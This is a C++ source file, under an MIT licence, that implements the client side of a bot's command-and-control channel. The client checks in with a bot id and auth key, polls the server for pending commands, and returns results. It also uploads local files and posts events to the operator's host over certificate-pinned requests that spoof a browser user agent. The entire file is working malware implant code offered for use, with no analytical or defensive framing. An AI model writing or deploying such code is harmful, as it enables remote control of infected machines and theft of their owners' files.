/*
MIT License
Copyright (c) 2020 4B4DB4B3
*/

#include "C2Client.h"

void C2Client::Checkin(const char* info) {
    std::string path = "/checkin?id=" + std::to_string(bot_id)
        + "&auth=" + std::string(auth_key)
        + "&info=" + std::string(info);
    // c2_host is also the expected cert CN (operator must generate cert with matching CN)
    Requests::GetRequestPinned(c2_host, "Mozilla/5.0", path.c_str(), c2_host);
}

void C2Client::SendResult(const char* data) {
    std::string path = "/result?id=" + std::to_string(bot_id)
        + "&auth=" + std::string(auth_key)
        + "&data=" + std::string(data);
    Requests::GetRequestPinned(c2_host, "Mozilla/5.0", path.c_str(), c2_host);
}

std::string C2Client::GetPendingCommand() {
    std::string path = "/cmd?id=" + std::to_string(bot_id)
        + "&auth=" + std::string(auth_key);
    return Requests::GetRequestPinned(c2_host, "Mozilla/5.0", path.c_str(), c2_host);
}

std::string C2Client::UploadFile(const char* localFilePath) {
    std::string path = "/upload?id=" + std::to_string(bot_id)
        + "&auth=" + std::string(auth_key);
    return Requests::PostFilePinned(c2_host, "Mozilla/5.0", path.c_str(), c2_host, localFilePath);
}

void C2Client::SendEvent(const char* json_body) {
    std::string path = "/event?id=" + std::to_string(bot_id)
        + "&auth=" + std::string(auth_key);
    Requests::PostJsonPinned(c2_host, "Mozilla/5.0", path.c_str(), c2_host, json_body);
}
